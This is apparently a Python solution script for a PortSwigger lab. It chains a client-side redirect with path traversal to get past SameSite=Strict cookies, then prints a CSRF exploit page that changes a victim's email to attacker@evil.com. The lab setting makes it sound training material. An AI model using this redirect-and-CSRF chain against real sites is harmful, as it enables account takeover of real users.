# Lab 08 — SameSite Strict bypass via client-side redirect
# PortSwigger: https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect
#
# Vulnerability: SameSite=Strict, but a client-side redirect on the same site
#                uses postId unsafely to construct a redirect URL
# Aim:           Chain the open redirect with a CSRF to change the victim's email
#
# Technique:
#   SameSite=Strict — no cross-site requests carry the cookie AT ALL.
#   BUT: once the victim's browser is navigating within the target site,
#   same-site requests carry Strict cookies normally.
#
#   The comment confirmation page redirects using postId in a JS redirect:
#     window.location = '/post/' + postId
#   Injecting path traversal into postId redirects to the change-email endpoint:
#     postId = 1/../../my-account/change-email?email=attacker@evil.com
#
#   Attack flow:
#     evil.com → TARGET/post/comment/confirmation?postId=1/../../my-account/change-email?...
#     ↑ first request is cross-site (no Strict cookie)
#     → page loads, JS redirect fires to /my-account/change-email
#     ↑ second request is SAME-SITE (Strict cookie IS sent) → email changed
#
#   📝 SameSite=Strict only gates the INITIAL cross-site request. Subsequent
#      same-site navigations (even triggered by that cross-site page) carry
#      the cookie normally. An open redirect on the target site defeats Strict.
#
# Usage: python csrf_lab08.py <url>

import sys
import urllib3
from proxies import proxies
from csrf_utils import banner, section, make_session, print_box, print_exploit_steps

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

VICTIM_EMAIL = "attacker@evil.com"

if __name__ == "__main__":
    banner()
    section("LAB 08 — CSRF: SameSite STRICT BYPASS VIA CLIENT-SIDE REDIRECT")

    if len(sys.argv) != 2:
        print("  Usage: python csrf_lab08.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    # Build the path-traversal postId that redirects to change-email
    # URL-encode the email @ and the ? separator for safe embedding
    redirect_target = (
        f"1/../../my-account/change-email"
        f"?email={VICTIM_EMAIL.replace('@', '%40')}&submit=1"
    )

    confirmation_url = f"{url}/post/comment/confirmation?postId={redirect_target}"

    print(f"\n  ➜  Redirect chain:")
    print(f"     evil.com → {confirmation_url}")
    print(f"     → JS redirect → {url}/my-account/change-email?email={VICTIM_EMAIL}")
    print(f"     (second hop is same-site → Strict cookie sent)\n")

    section("Exploit HTML for the exploit server")

    exploit = f"""\
<script>
document.location = '{confirmation_url}';
</script>"""

    print_box("EXPLOIT SERVER BODY", exploit)
    print_exploit_steps()
    print()
    print("  ℹ  The JS redirect on the confirmation page is the key.")
    print("     Path traversal (../../) escapes /post/ and lands on /my-account/.")
    print("     That redirect is same-site → Strict cookie is sent → email changes.")
